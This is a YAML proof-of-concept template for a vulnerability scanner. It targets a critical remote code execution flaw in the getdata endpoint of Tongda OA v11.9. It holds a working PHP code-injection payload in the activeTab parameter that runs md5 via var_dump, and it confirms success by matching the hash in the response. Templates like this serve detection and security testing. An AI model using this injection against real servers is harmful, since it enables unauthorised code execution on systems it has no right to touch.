name: poc-yaml-tongda-oa-getdata-rce
binding: e04cdfe3-ec9c-46d2-af2f-d8a2a1ac137e
manual: true
detail:
    author: EASY(https://github.com/EASY233)
    links:
        - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20getdata%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
    vulnerability:
        id: CT-515857
        level: critical
transport: http
set:
    r1: randomLowercase(12)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Evar_dump(md5(%22{{r1}}%22)))%3B/*&id=19&module=Carouselimage
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(string(md5(r1))))
expression: r0()
